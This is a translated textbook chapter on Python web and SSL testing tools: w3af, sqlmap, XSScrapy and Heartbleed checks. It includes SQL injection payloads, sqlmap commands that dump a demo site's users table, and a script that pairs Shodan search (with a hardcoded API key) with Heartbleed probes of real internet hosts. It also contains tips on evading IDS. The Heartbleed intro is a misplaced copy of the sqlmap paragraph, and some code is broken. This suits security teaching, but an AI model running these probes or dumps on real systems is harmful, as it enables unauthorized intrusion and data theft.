它是一个允许对 web 应用程序进行不同类型测试的框架，以确定该应用程序可能存在的漏洞，根据可能对 web 基础设施或其客户端的影响程度详细说明了关键级别。

一旦分析完成，w3af 会显示关于在指定网站上发现的漏洞的详细信息，这些漏洞可能会因为额外的利用而受到威胁。

在结果选项卡中，我们可以看到对特定网站的扫描结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/acf93d31-c708-404c-9492-ea5c7b3f443f.png)

在**描述**选项卡中，我们可以看到 SQL 注入漏洞的描述：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/94da4ae4-bc19-4f9b-9bbd-f92f6e6365cd.png)

我们还在网站上获得了**跨站脚本（XSS）漏洞**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7702703b-6961-4b6d-b6af-1410cadf3dfc.png)

这份分析结果的完整报告可在共享的**testphp_vulnweb_com.pdf**文件中找到。

在这份报告中，我们可以看到所有检测到的漏洞影响的文件，比如 SQL 注入：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3fa55c17-584b-4b98-9473-a5472a7cdc63.png)

# W3AF 配置文件

W3AF 中的配置文件是已保存的插件配置，专注于特定目标的配置。这些类型的关联是在启动信息收集过程时进行的。使用配置文件允许我们只启用对一个目标有趣的插件，而停用其余的插件。

在配置文件中，我们可以强调：

+   **bruteforce:** 它允许我们通过暴力破解过程从认证表单中获取凭据。

+   **audit_high_risk:** 允许您识别最危险的漏洞，比如 SQL 注入和 XSS。

+   **full_audit_manual_disc:** 它允许我们手动进行发现，并探索网站以寻找已知的漏洞。

+   **full_audit:** 它允许使用 webSpider 插件对网站进行完整的审计。

+   **OWASP_TOP10：** 允许您搜索主要的 OWASP 安全漏洞。有关安全漏洞的更多信息，请查看：[`www.owasp.org/index.php/OWASP_Top_Ten_Project`](http://www.owasp.org/index.php/OWASP_Top_Ten_Project)。

+   **web_infrastructure:** 使用所有可用的技术来获取 web 基础设施的指纹。

+   **fast_scan:** 它允许我们对网站进行快速扫描，只使用最快的审计插件。

# W3af 安装

W3af 是一个需要许多依赖项的 Python 工具。有关安装 w3af 的具体细节可以在官方文档中找到：[`docs.w3af.org/en/latest/install.html`](http://docs.w3af.org/en/latest/install.html)。

安装它的要求是：

+   Python 2.5 或更高版本**：** `apt-get install python`

+   Python 包**：** `apt-get install nltk python-nltk python-lxml python-svn python-fpconst python-pygooglechart python-soappy python-openssl python-scapy python-lxml python-svn`

源代码可在 GitHub 存储库中找到（[`github.com/andresriancho/w3af`](https://github.com/andresriancho/w3af)）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/563e241a-542c-4a2d-9d58-1d6510fed56f.png)

现在，为了证明整个环境已经正确配置，只需转到下载了框架的目录并执行`./w3af_console`命令。

如果发现环境中所有库都正确配置，这将打开准备接收命令的 w3af 控制台。要从相同目录执行 GTK 界面，请执行`./w3af_gui`。

这个命令将打开我们在概述部分看到的图形用户界面。

# Python 中的 W3af

要从任何 Python 脚本中使用 W3AF，需要了解其实现的某些细节，以及允许与框架进行编程交互的主要类。

框架中包含几个类，然而，管理整个攻击过程最重要的是`core.controllers.w3afCore`模块的`w3afCore`类。该类的实例包含启用插件、建立攻击目标、管理配置文件以及最重要的启动、中断和停止攻击过程所需的所有方法和属性。

[`github.com/andresriancho/w3af-module`](https://github.com/andresriancho/w3af-module)

我们可以在 GitHub 存储库的此文件夹中找到主控制器：

[`github.com/andresriancho/w3af-module/tree/master/w3af-repo/w3af/core/controllers`](https://github.com/andresriancho/w3af-module/tree/master/w3af-repo/w3af/core/controllers)

`w3afCore`类的一个实例具有 plugins 属性，允许执行多种类型的操作，如列出特定类别的插件、激活和停用插件或为可配置的插件设置配置选项。

您可以在 w3af 文件夹中的`w3af_plugins.py`文件中找到以下代码：

```py
from w3af.core.controlles.w3afCore import w3afCore

w3af = w3afCore()

#list of plugins in audit category
pluginType = w3af.plugins.get_plugin_list('audit')
for plugin in pluginType:
    print 'Plugin:'+plugin

#list of available plugin categories
plugins_types = w3af.plugins.get_plugin_types()
for plugin in plugins_types:
    print 'Plugin type:'+plugin

#list of enabled plugins
plugins_enabled = w3af.plugins.get_enabled_plugin('audit')
for plugin in plugins_enabled:
    print 'Plugin enabled:'+plugin
```

w3af 的另一个有趣功能是它允许您管理配置文件，其中包括启用的配置文件和攻击目标对应的配置。

您可以在 GitHub 存储库中的 w3af 文件夹中的`w3af_profiles.py`文件中找到以下代码：

```py
from w3af.core.controlles.w3afCore import w3afCore

w3af = w3afCore()

#list of profiles
profiles = w3af.profiles.get_profile_list()
for profile in profiles:
    print 'Profile desc:'+profile.get_desc()
    print 'Profile file:'+profile.get_profile_file()
    print 'Profile name:'+profile.get_name()
    print 'Profile target:'+profile.get_target().get("target")

w3af.profiles.use_profile('profileName')
w3af.profiles.save_current_to_new_profile('profileName','Profile description')
```

# 使用 Python 工具发现 SQL 漏洞

本节介绍了如何使用 sqlmap 渗透测试工具测试网站是否安全免受 SQL 注入攻击。sqlmap 是一种自动化工具，用于查找和利用注入值在查询参数中的 SQL 注入漏洞。

# SQL 注入简介

OWASP 十大将注入作为第一风险。如果应用程序存在 SQL 注入漏洞，攻击者可以读取数据库中的数据，包括机密信息和散列密码（或更糟糕的是，应用程序以明文形式保存密码）。

SQL 注入是一种利用未经验证的输入漏洞来窃取数据的技术。这是一种代码注入技术，攻击者通过执行恶意的 SQL 查询来控制 Web 应用程序的数据库。通过一组正确的查询，用户可以访问数据库中存储的信息。例如，考虑以下`php 代码`段：

```py
$variable = $_POST['input'];
mysql_query("INSERT INTO `table` (`column`) VALUES ('$variable')");
```

如果用户输入`“value’); DROP TABLE table;–”`作为输入，原始查询将转换为一个 SQL 查询，我们正在更改数据库：

```py
INSERT INTO `table` (`column`) VALUES('value'); DROP TABLE table;--')
```

# 识别易受 SQL 注入攻击的页面

识别具有 SQL 注入漏洞的网站的一个简单方法是向 URL 添加一些字符，例如引号、逗号或句号。例如，如果页面是用 PHP 编写的，并且您有一个传递搜索参数的 URL，您可以尝试在末尾添加一个参数。

进行注入基本上将使用 SQL 查询，例如 union 和 select 以及著名的 join。只需在页面的 URL 中进行操作，例如输入以下行，直到找到上面显示的错误并找到易受访问的表的名称。

如果您观察到[`testphp.vulnweb.com/listproducts.php?cat=1`](http://testphp.vulnweb.com/listproducts.php?cat=1)，其中'GET'参数 cat 可能容易受到 SQL 注入攻击，攻击者可能能够访问数据库中的信息。

检查您的网站是否易受攻击的一个简单测试是将 get 请求参数中的值替换为星号(*)。例如，在以下 URL 中：

[`testphp.vulnweb.com/listproducts.php?cat=*`](http://testphp.vulnweb.com/listproducts.php?cat=*)

如果这导致类似于前面的错误，我们可以断定该网站易受 SQL 注入攻击。

在这个屏幕截图中，当我们尝试在易受攻击的参数上使用攻击向量时，我们可以看到数据库返回的错误：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/80922e96-f6b7-442b-afd3-8aab9b8ef063.png)

使用 Python，我们可以构建一个简单的脚本，从`sql-attack-vector.txt`文本文件中读取可能的 SQL 攻击向量，并检查注入特定字符串的输出结果。目标是从识别易受攻击的参数的 URL 开始，并将原始 URL 与攻击向量组合在一起。

您可以在`sql_injection`文件夹中的`test_url_sql_injection.py`文件中找到以下代码：

```py
import requests url = "http://testphp.vulnweb.com/listproducts.php?cat="

with open('sql-attack-vector.txt') as file:
for payload in file:
    print ("Testing "+ url + payload)
    response = requests.post(url+payload)
    #print(response.text)
    if "mysql" in response.text.lower():
        print("Injectable MySQL detected")
        print("Attack string: "+payload)
    elif "native client" in response.text.lower():
        print("Injectable MSSQL detected")
        print("Attack string: "+payload)
    elif "syntax error" in response.text.lower():
        print("Injectable PostGRES detected")
        print("Attack string: "+payload)
    elif "ORA" in response.text.lower():
        print("Injectable Oracle detected")
        print("Attack string: "+payload)
    else:
        print("Not Injectable")
```

您可以在`sql_injection`文件夹中的`sql-attack-vector.txt`文件中找到以下代码：

```py
" or "a"="a
" or "x"="x
" or 0=0 #
" or 0=0 --
" or 1=1 or ""="
" or 1=1--
```

执行`test_url_sql_injection.py`时，我们可以看到易受多个向量攻击的可注入 cat 参数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/83c0687c-c1ef-4791-89f7-348735a48ee7.png)

# 介绍 SQLmap

SQLmap 是用 Python 编写的最著名的工具之一，用于检测漏洞，例如 SQL 注入。为此，该工具允许对 URL 的参数进行请求，这些参数通过 GET 或 POST 请求指示，并检测某些参数是否容易受攻击，因为参数未正确验证。此外，如果它检测到任何漏洞，它有能力攻击服务器以发现表名，下载数据库，并自动执行 SQL 查询。

在[`sqlmap.org`](http://sqlmap.org)了解更多关于 sqlmap 的信息。

Sqlmap 是一个用 Python 编写的自动化工具，用于查找和利用 SQL 注入漏洞。它可以使用各种技术来发现 SQL 注入漏洞，例如基于布尔的盲目、基于时间的、基于 UNION 查询的和堆叠查询。

Sqlmap 目前支持以下数据库：

+   MySQL

+   Oracle

+   PostgreSQL

+   Microsoft SQL Server

一旦它在目标主机上检测到 SQL 注入，您可以从各种选项中进行选择：

+   执行全面的后端 DBMS 指纹

+   检索 DBMS 会话用户和数据库

+   枚举用户、密码哈希、权限和数据库

+   转储整个 DBMS 表/列或用户特定的 DBMS 表/列

+   运行自定义 SQL 语句

# 安装 SQLmap

Sqlmap 预装在一些面向安全任务的 Linux 发行版中，例如 kali linux，这是大多数渗透测试人员的首选。但是，您可以使用`apt-get`命令在其他基于 debian 的 Linux 系统上安装`sqlmap`：

```py
sudo apt-get install sqlmap
```

我们也可以从 GitHub 存储库的源代码中安装它 - [`github.com/sqlmapproject/sqlmap`](https://github.com/sqlmapproject/sqlmap)：

```py
git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

您可以使用`-h`选项查看可以传递给`sqlmap.py`脚本的参数集：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/35e8831c-fbcd-4b4e-bdd7-781048bcc6a8.png)

我们将用于基本 SQL 注入的参数如前图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d0f18985-5ff0-41f4-9979-00d00ff45700.png)

# 使用 SQLMAP 测试网站的 SQL 注入漏洞

这些是我们可以遵循的主要步骤，以获取有关潜在 SQL 注入漏洞的数据库的所有信息：

**步骤 1：列出现有数据库的信息**

首先，我们必须输入要检查的 Web URL，以及-u 参数。我们还可以使用`--tor`参数，如果希望使用代理测试网站。现在通常，我们希望测试是否可能访问数据库。对于此任务，我们可以使用`--dbs`选项，列出所有可用的数据库。

`sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs`

通过执行上一个命令，我们观察到存在两个数据库，`acuart`和`information_schema`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/d2cb69e2-3cbd-46b4-ac35-36d1b451aea0.png)

我们得到以下输出，显示有两个可用的数据库。有时，应用程序会告诉您它已经识别了数据库，并询问您是否要测试其他数据库类型。您可以继续输入“Y”。此外，它可能会询问您是否要测试其他参数以查找漏洞，请在此处输入“Y”，因为我们希望彻底测试 Web 应用程序。

**步骤 2：列出特定数据库中存在的表的信息**

要尝试访问任何数据库，我们必须修改我们的命令。我们现在使用-D 来指定我们希望访问的数据库的名称，一旦我们访问了数据库，我们希望看看是否可以访问表。

对于此任务，我们可以使用`--tables`查询来访问 acuart 数据库：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart --tables
```

在下图中，我们看到已恢复了八个表。通过这种方式，我们确切地知道网站是易受攻击的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/fe550ac2-0495-41f8-ac80-aea3322b5a87.png)

**步骤 3：列出特定表的列信息**

如果我们想要查看特定表的列，我们可以使用以下命令，其中我们使用`-T`来指定表名，并使用**`--columns`**来查询列名。

这是我们可以尝试访问‘users’表的命令：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1  -D acuart -T users
--columns
```

**步骤 4：从列中转储数据**

同样，我们可以使用以下命令访问特定表中的所有信息，其中`**--dump`查询检索用户表中的所有数据：

```py
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump
```

从以下图片中，我们可以看到我们已经访问了数据库中的数据：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/6c92aa64-3640-4011-9c2d-9184315084b5.png)

# 其他命令

同样，在易受攻击的网站上，我们可以通过其他命令从数据库中提取信息。

使用此命令，我们可以从数据库中获取所有用户：

```py
$ python sqlmap.py -u [URL] --users
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" --users
```

在这里，我们获得了在数据库管理系统中注册的用户：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3d67ef38-867a-4907-aa9f-5277b7e4b8c1.png)

使用此命令，我们可以从表中获取列：

```py
$ python sqlmap.py -u [URL] -D [Database] -T [table] --columns
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" -D acuart -T users --columns
```

在这里，我们从用户表中获取列：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/948d4ea1-9b96-47c7-9ad7-e817d5366bd5.png)

使用此命令，我们可以获得一个交互式 shell：

```py
$ python sqlmap.py -u [URL] --sql-shell
sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=*" --sql-shell
```

在这里，我们获得一个与数据库交互的 shell，使用 sql 语言查询：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/18f7991f-639c-4f3a-8c3a-4efdafa79d07.png)

# 其他用于检测 SQL 注入漏洞的工具

在 Python 生态系统中，我们可以找到其他工具，例如 DorkMe 和 Xsscrapy，用于发现 SQL 注入漏洞。

# DorkMe

DorkMe 是一个旨在通过 Google Dorks 更轻松地搜索漏洞的工具，例如 SQL 注入漏洞([`github.com/blueudp/DorkMe`](https://github.com/blueudp/DorkMe))。

您还需要安装`pip install Google-Search-API` Python 包。

我们可以使用`requirements.txt`文件检查依赖项并安装它们：

```py
pip install -r requirements.txt
```

这是脚本提供的选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f3dcb505-a57c-47a1-9d7b-4a38abce9acd.png)

我们可以检查在上一节中使用 sqlmap 的相同`url`。我们可以使用建议用于测试的`--dorks vulns -v`选项参数：

```py
python DorkMe.py --url http://testphp.vulnweb.com/listproducts.php --dorks vulns -v
```

我们可以看到我们获得了高影响力的 SQL 注入漏洞：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/3a242171-0cd7-42ea-b572-43668e9098b0.png)

# XSScrapy

XSScrapy 是基于 Scrapy 的应用程序，允许我们发现 XSS 漏洞和 SQL 注入类型的漏洞。

源代码可在 GitHub 存储库中找到：[`github.com/DanMcInerney/xsscrapy`](https://github.com/DanMcInerney/xsscrapy)。

在我们的机器上安装它，我们可以克隆存储库并执行`python pip`命令，以及包含应用程序使用的 Python 依赖项和模块的`requirements.txt`文件：

```py
$ git clone https://github.com/DanMcInerney/xsscrapy.git
$ pip install -r requirements.txt
```

您需要安装的主要依赖项之一是`scrapy`：[`scrapy.org/`](https://scrapy.org/)。

Scrapy 是 Python 的一个框架，允许您`执行网页抓取任务、网络爬虫过程和数据分析`。它允许我们递归扫描网站的内容，并对这些内容应用一组规则，以提取对我们有用的信息。

这些是 Scrapy 中的主要元素：

+   **解释器：**允许快速测试，以及创建具有定义结构的项目。

+   **蜘蛛：**负责向客户端提供的域名列表发出 HTTP 请求并对从 HTTP 请求返回的内容应用规则的代码例程，规则以正则表达式或 XPATH 表达式的形式呈现。

+   **XPath 表达式：**使用 XPath 表达式，我们可以获得我们想要提取的信息的相当详细的级别。例如，如果我们想要从页面中提取下载链接，只需获取元素的 Xpath 表达式并访问 href 属性即可。

+   **Items:** Scrapy 使用一种基于 XPATH 表达式的机制，称为“**Xpath 选择器**”。这些选择器负责应用开发人员定义的 Xpath 规则，并组成包含提取的信息的 Python 对象。项目就像信息的容器，它们允许我们存储遵循我们应用的规则的信息，当我们返回正在获取的内容时。它们包含我们想要提取的信息字段。

在此截图中，我们可以看到官方网站上最新的 scrapy 版本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/de0b41a1-c16d-4835-9c8e-5a4f242152d4.png)

您可以使用`pip install scrapy`命令安装它。它也可以在 conda 存储库中找到，并且您可以使用`conda install -c conda-forge scrapy`命令进行安装。

XSScrapy 在命令行模式下运行，并具有以下选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/a40b68a3-b0cb-44c2-9a82-552111ab4e38.png)

最常用的选项是对要分析的 URL(`-u`/url)进行参数化，从根 URL 开始，该工具能够跟踪内部链接以分析后续链接。

另一个有趣的参数是允许我们建立对我们正在分析的站点的最大同时连接数(`-c`/-connections)，这对于防止防火墙或 IDS 系统检测攻击并阻止来自发起攻击的 IP 的请求非常实用。

此外，如果网站需要身份验证（摘要或基本），则可以使用`-l`（登录）和`-p`（密码）参数指示用户登录和密码。

我们可以尝试使用我们之前发现 XSS 漏洞的网站执行此脚本：

```py
python xsscrapy.py -u http://testphp.vulnweb.com
```

在执行此脚本时，我们可以看到它检测到一个 php 网站中的`sql`注入：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/1a57a179-98cb-4e8c-8483-d854e6e6ffdf.png)

此分析的执行结果可在 GitHub 存储库中的`testphp.vulnweb.com.txt`共享文件中找到。

# 测试 heartbleed 和 SSL/TLS 漏洞

本节解释了如何使用 sqlmap 渗透测试工具测试网站是否安全免受 SQL 注入的影响。sqlmap 是一种自动化工具，用于查找和利用在查询参数中注入值的 SQL 注入漏洞。

# 介绍 OpenSSL

Openssl 是 SSL 和 TLS 协议的实现，广泛用于各种类型的服务器；互联网上相当高比例的服务器使用它来确保客户端和服务器之间使用强加密机制进行通信。

然而，它是一种在其多年的发展中多次遭到侵犯的实现，影响了用户信息的保密性和隐私。已公开的一些漏洞已经得到了纠正；然而，应该应用于易受攻击的 OpenSSL 版本的安全补丁并没有被迅速应用，因此在 Shodan 上可以找到易受攻击的服务器。

# 在 Shodan 中查找易受攻击的服务器

我们可以轻松地编写一个脚本，获取由于易受攻击的 OpenSSL 版本而可能易受 heartbleed 影响的服务器的结果。

在`heartbleed_shodan`文件夹中的`ShodanSearchOpenSSL.py`文件中可以找到以下代码：

```py
import shodan
import socket
SHODAN_API_KEY = "v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik"
api = shodan.Shodan(SHODAN_API_KEY)
# Wrap the request in a try/ except block to catch errors
try:
    # Search Shodan OpenSSL/1.0.1
    results = api.search('OpenSSL/1.0.1')
    # Show the results
    print('Total Vulnerable servers: %s' % results['total'])
    for result in results['matches']:
        print('IP: %s' % result['ip_str'])
        print('Hostname: %s' % socket.getfqdn(result['ip_str']))
        print(result['data'])
except shodan.APIError as e:
    print('Error: %s' % e)
```

正如您在这张图片中所看到的，可以受到影响且具有 OpenSSL v1.0 的服务器总数为 3,900：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/25ef6860-8d38-4e66-aab8-9f6a4e6ff8f7.png)

如果我们从 Web 界面发出请求，我们会看到更多结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7875cba2-8c33-4114-b7ba-2bb5478a06d7.png)

攻击者可以尝试访问这些服务器中的任何一个；为此，可以使用位于[`www.exploit-db.com/exploits/32745`](https://www.exploit-db.com/exploits/32745)URL 中的漏洞利用。在下一节中，我们将分析此漏洞以及如何利用它。

# Heartbleed 漏洞（OpenSSL CVE-2014-0160）

漏洞 CVE-2014-0160，也称为 Heartbleed，被认为是迄今为止互联网上最严重的安全故障之一。

这是`OpenSSL`软件包中最严重的漏洞之一。要了解此漏洞的影响，有必要了解“HeartBeat”扩展的运作方式，这一扩展一直是 OpenSSL 运作的核心要素，因为它允许我们改进使用加密通道（如 SSL）的客户端和服务器的性能。

要与服务器建立 SSL 连接，必须完成一个称为“握手”的过程，其中包括对称和非对称密钥的交换，以建立客户端和服务器之间的加密连接。这个过程在时间和计算资源方面非常昂贵。

HeartBeat 是一种机制，它允许我们优化握手建立的时间，以便允许服务器指示 SSL 会话在客户端使用时必须保持。

该机制是客户端插入有效负载并在结构的一个字段中指示所述有效负载的长度。随后，服务器接收所述数据包，并负责使用称为`TLS1_HB_RESPONSE`的结构组成响应消息，该结构将仅由`TLS1_HB_REQUEST`结构长度中指示的“n”字节组成。

OpenSSL 中引入的实现问题在于未正确验证`TLS_HB_REQUEST`结构中发送的数据的长度，因为在组成`TLS1_HB_RESPONSE`结构时，服务器负责定位服务器内存中`TLS_HB_REQUEST`结构的确切位置，并根据长度字段中设置的值读取有效负载所在的字段的“n”字节。

这意味着攻击者可以发送一个带有数据字节的有效负载，并在长度字段中设置任意值，通常小于或等于 64 k 字节，服务器将发送一个带有 64 k 字节信息的`TLS1_HB_RESPONSE`消息，该信息存储在服务器的内存中。

这些数据可能包含敏感用户信息和系统密码，因此这是一个非常严重的漏洞，影响了数百万服务器，因为 OpenSSL 是 Apache 和 Ngnix 服务器广泛使用的实现。正如我们在 Shodan 中看到的，今天仍然有使用 1.0.1 版本的服务器，其中大多数可能是易受攻击的。

您可以在`heartbleed_shodan`文件夹中的`Test_heartbeat_vulnerability.py`中找到代码。

该脚本尝试在指定端口与服务器进行握手，并且随后负责发送一个带有恶意结构`TLS1_HB_REQUEST`的数据包。

如果服务器返回的数据包是“24”类型，则表示它是带有`TLS1_HB_RESPONSE`结构的响应，在请求数据包中发送的有效负载大小大于响应有效负载的大小时，可以认为服务器是易受攻击的，并且已返回与服务器内存相关的信息，否则可以假定服务器已处理了恶意请求，但没有返回任何额外的数据。这表明没有信息泄漏，服务器不易受攻击。

在易受攻击的服务器上运行脚本后，输出将类似于此处显示的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/57aa2e26-1164-4706-b971-7857370875aa.png)

要在启用了 openssl 的服务器中检测此漏洞，我们发送一个特定请求，如果响应服务器等于特定的 heartbleed 有效负载，则服务器是易受攻击的，您可以访问理论上应该受 SSL 保护的信息。

服务器的响应包括存储在进程内存中的信息。除了是一个影响许多服务的严重漏洞外，检测易受攻击的目标然后定期从服务器内存中提取块是非常容易的。

我们可以将 shodan 搜索与检查服务器的心脏出血漏洞结合起来。

为此任务，我们已经定义了`shodanSearchVulnerable()`和`checkVulnerability()`方法，用于检查与“OpenSSL 1.0.1”Shodan 搜索匹配的每个服务器的易受攻击性。

对于 python 2.x，您可以在`heartbleed_shodan`文件夹中的`testShodan_openssl_python2.py`中找到代码。

对于 python 3.x，您可以在`heartbleed_shodan`文件夹中的`testShodan_openssl_python3.py`中找到代码。

在以下代码中，我们回顾了我们可以开发的用于搜索易受 openssl 版本易受攻击的 shodan 服务器的主要方法，还需要检查端口 443 是否打开：

```py
def shodanSearchVulnerable(self,query):
    results = self.shodanApi.search(query)
    # Show the results
    print('Results found: %s' % results['total'])
    print('-------------------------------------')
    for result in results['matches']:
        try:
            print('IP: %s' % result['ip_str'])
            print(result['data'])
            host = self.obtain_host_info(result['ip_str'])
            portArray = []
            for i in host['data']:
                port = str(i['port'])
                portArray.append(port)
            print('Checking port 443........................')
            #check heartbeat vulnerability in port 443
            checkVulnerability(result['ip_str'],'443')
        except Exception as e:
            print('Error connecting: %s' % e)
            continue
        except socket.timeout:
            print('Error connecting Timeout error: %s' % e)
            continue

    print('-----------------------------------------------')
    print('Final Results')
    print('-----------------------------------------------')
    if len(server_vulnerable) == 0:
        print('No Server vulnerable found')
    if len(server_vulnerable) > 0:
        print('Server vulnerable found ' + str(len(server_vulnerable)))

    for server in server_vulnerable:
        print('Server vulnerable: '+ server)
        print(self.obtain_host_info(server))
```

一旦我们定义了在 shodan 中搜索的方法并检查了`端口 443`是否打开，我们可以使用`socket`模块检查特定的心脏出血漏洞：

```py
def checkVulnerability(ip,port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Connecting with ...' + ip + ' Port: '+ port)
        sys.stdout.flush()
        s.connect((ip, int(port)))
        print('Sending Client Request...')
        sys.stdout.flush()
        s.send(hello)
        print('Waiting for Server Request...')
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print('Server closed connection without sending Server Request.')
                break
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
            print('Sending heartbeat request...')
            sys.stdout.flush()
            s.send(hb)
            if hit_hb(s):
                server_vulnerable.append(ip)
    except socket.timeout:
        print("TimeOut error")
```

# 用于测试 openssl 易受攻击性的其他工具

在本节中，我们介绍了一些可以用于测试与心脏出血和证书相关的 openssl 漏洞的工具。

# 心脏出血-大规模测试

这个工具允许我们以多线程的高效方式扫描多个主机的心脏出血。这个测试 OpenSSL 版本易受心脏出血漏洞的服务器，而不是利用服务器，因此心跳请求不会导致服务器泄漏内存中的任何数据或以未经授权的方式暴露任何数据：[`github.com/musalbas/heartbleed-masstest`](https://github.com/musalbas/heartbleed-masstest)。

# 使用 nmap 端口扫描程序扫描心脏出血

Nmap 有一个 Heartbleed 脚本，可以很好地检测易受攻击的服务器。该脚本可在 OpenSSL-Heartbleed nmap 脚本页面上找到：

[`nmap.org/nsedoc/scripts/ssl-heartbleed.html`](http://nmap.org/nsedoc/scripts/ssl-heartbleed.html)

[`svn.nmap.org/nmap/scripts/ssl-heartbleed.nse`](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse)

在 Windows 操作系统中，默认情况下，脚本位于`C:\Program Files (x86)\Nmap\scripts`路径中。

在 Linux 操作系统中，默认情况下，脚本位于`/usr/share/nmap/scripts/`路径中。

```py
nmap -p 443 —script ssl-heartbleed [IP Address]
```

我们所需要做的就是使用 Heartbleed 脚本并添加目标站点的 IP 地址。如果我们正在分析的目标易受攻击，我们将看到这个：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/081c95cd-444d-4a99-9d54-c3548dd4c947.png)

# 使用 SSLyze 脚本分析 SSL/TLS 配置

SSLyze 是一个使用 python 3.6 工作的 Python 工具，用于分析服务器的 SSL 配置，以检测诸如不良证书和危险密码套件之类的问题。

这个工具可以在`pypi`存储库中找到，您可以从源代码或使用 pip install 命令进行安装：

[`pypi.org/project/SSLyze/`](https://pypi.org/project/SSLyze/)

[`github.com/nabla-c0d3/sslyze`](https://github.com/nabla-c0d3/sslyze)

还需要安装一些依赖项，例如`nassl`，也可以在 pypi 存储库中找到：

[`pypi.org/project/nassl/`](https://pypi.org/project/nassl/)

[`github.com/nabla-c0d3/nassl`](https://github.com/nabla-c0d3/nassl)

这些是脚本提供的选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/7ab6fc9d-d479-4a73-9feb-bae03b64836e.png)

它提供的选项之一是用于检测此漏洞的 HeartbleedPlugin：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/edecd339-9f8c-4ca7-a9fb-08dc01296eb5.png)

它还提供了另一个用于检测服务器正在使用的 OpenSSL 密码套件的插件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/2d99e43d-c5e8-480a-99a4-ab36aaf2e692.png)

如果我们尝试在特定 IP 地址上执行脚本，它将返回一个带有结果的报告：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/8f701679-aa3f-46b4-81d0-ea7ae14db25a.png)

此分析的执行结果可在 GitHub 存储库中的`sslyze_72.249.130.4.txt`共享文件中找到。

# 其他服务

有几个在线服务可以帮助您确定服务器是否受到此漏洞的影响，还有其他用于测试服务器和域中的 ssl 版本和证书的服务，例如 ssllabs fror qualys。

在这些链接中，我们可以找到一些进行此类测试的服务：

+   [`filippo.io/Heartbleed`](https://filippo.io/Heartbleed)

+   [`www.ssllabs.com/ssltest/index.html`](https://www.ssllabs.com/ssltest/index.html)

qualys 在线服务以**报告**的形式返回结果，其中我们可以看到服务器正在使用的 openssl 版本可能存在的问题：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/dfa631a6-0027-4e19-bc8b-a3c7138ff7cf.png)

我们还可以详细了解 SSL/TLS 版本和有关可能漏洞的信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/30fabd61-e4eb-4fdd-9765-37ecdb4f8844.png)

使用 Shodan 服务，您可以查看与服务器和 SSL 证书中检测到的 CVE 漏洞相关的更多信息。

在此截图中，我们可以看到与服务器中的配置问题相关的其他 CVE：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/ms-py-net-sec/img/f1769398-c548-456c-956a-4468ff4aced7.png)

# 总结

目前，对 Web 应用程序中的漏洞进行分析是执行安全审计的最佳领域。本章的目标之一是了解 Python 生态系统中的工具，这些工具可以帮助我们识别 Web 应用程序中的服务器漏洞，例如 w3af 和 sqlmap。在 SQL 注入部分，我们涵盖了 SQL 注入和使用 sqlmap 和 xssscrapy 检测此类漏洞的工具。此外，我们还研究了如何检测与服务器中的 OpenSSL 相关的漏洞。

